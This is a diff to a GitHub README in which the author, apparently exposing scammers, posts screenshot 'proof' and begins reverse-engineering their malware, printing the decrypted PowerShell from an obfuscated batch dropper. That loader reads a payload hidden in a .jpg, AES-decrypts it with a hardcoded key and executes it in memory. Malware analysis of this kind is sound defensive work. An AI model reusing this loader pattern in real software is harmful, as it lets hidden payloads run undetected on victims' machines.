@@ -25,6 +25,36 @@ These dudes really aren't smart
 <img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/93df375d-f7fe-43af-b93b-de34c7bc3886" />
 
 
+## more proof
+<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/73b1802c-71d5-474f-941b-3fc867654a30" />
+<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/cbf0eb69-25c0-488d-a9d1-a9c1444ae778" />
+<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/22995528-1fef-4c83-ac86-96d893749021" />
+<img width="576" height="1280" alt="image" src="https://github.com/user-attachments/assets/128f24b0-b8b1-4bc4-a2a5-7a7f580641a5" />
+
+
 credits to swr_1 for help on discord
 
 # in progress of reversing the shit malware
+stage one of malware is a bat file with a bunch of junk and encrypted functions
+<img width="1194" height="572" alt="image" src="https://github.com/user-attachments/assets/c99dd926-dcfc-4fa3-9b0a-9a3580155369" />
+the main things we actually want tho are the last lines of the batch script which are encrypted powershell commands
+<img width="1777" height="122" alt="image" src="https://github.com/user-attachments/assets/17e8b789-d453-4f9e-8c52-3c0632e42dce" />
+
+once we decrypt everything the powershell is actually really simple
+```powershell
+$mL='lODZdCk.jpg'
+$nV=[IO.File]::ReadAllText($mL)
+$nV=(($nV -split '\\+\\+\\+\\+A',2)[0]).Trim()
+$o3=[Convert]::FromBase64String('81bMJPoAuf6ove+7O+ikD3Z39s/veVPzMvhHg2cZV7g=')
+$oH=[Convert]::FromBase64String($nV)
+$Nq=$oH[0..15]
+$iW=$oH[16..($oH.Length-1)]
+$LD=[Security.Cryptography.Aes]::Create()
+$LD.Mode=[Security.Cryptography.CipherMode]::CBC
+$LD.Padding=[Security.Cryptography.PaddingMode]::PKCS7
+$LD.Key=$o3
+$LD.IV=$Nq
+$e1=[Text.Encoding]::UTF8.GetString($LD.CreateDecryptor().TransformFinalBlock($iW,0,$iW.Length))
+$LD.Dispose()
+$null=[scriptblock]::Create($e1).InvokeReturnAsIs()
+```
